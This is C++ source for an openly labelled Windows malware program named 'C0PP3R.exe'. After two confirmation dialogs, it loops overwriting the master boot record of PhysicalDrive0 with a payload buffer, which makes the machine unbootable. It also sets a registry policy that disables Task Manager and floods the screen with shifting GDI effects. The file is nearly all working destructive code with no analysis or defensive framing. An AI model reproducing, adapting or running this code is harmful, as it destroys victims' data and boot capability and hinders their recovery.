#include <windows.h>
#include "bootrec.h"
#include <cstdlib>

DWORD WINAPI mbr(LPVOID lpParam) {
    while(1) {
        DWORD dwBytesWritten;
        HANDLE hDisk = CreateFileW(
            L"\\\\.\\PhysicalDrive0",
            GENERIC_ALL,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            0, OPEN_EXISTING, 0, 0
        );
        WriteFile(hDisk, MasterBootRecord, 32768, &dwBytesWritten, 0);
        CloseHandle(hDisk);
    }
}

DWORD WINAPI notaskmgr(LPVOID lpParam) {
    system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableTaskMgr /t reg_dword /d 1 /f");
    return 1;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    if (MessageBoxW(NULL, L"Run Malware?", L"C0PP3R.exe", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
        ExitProcess(0);
    } else {
        if (MessageBoxW(NULL, L"Are you sure you want to execute this?\nIt will make your computer unbootable", L"C0PP3R.exe - LAST WARNING", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
            ExitProcess(0);
        } else {
            CreateThread(0, 0, mbr, 0, 0, 0);
            CreateThread(0, 0, notaskmgr, 0, 0, 0);
            int w = GetSystemMetrics(0);
            int h = GetSystemMetrics(1);
            while(1) {
                HDC hdc = GetDC(0);
                HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
                SelectObject(hdc, brush);
                BitBlt(hdc, 0, 0, w, h, hdc, -30, 0, 0x1900ac010e);
                BitBlt(hdc, 0, 0, w, h, hdc, w - 30, 0, 0x1900ac010e);
                BitBlt(hdc, 0, 0, w, h, hdc, 0, -30, 0x1900ac010e);
                BitBlt(hdc, 0, 0, w, h, hdc, 0, h - 30, 0x1900ac010e);
                DeleteObject(brush);
                ReleaseDC(0, hdc);
            }
        }
    }
}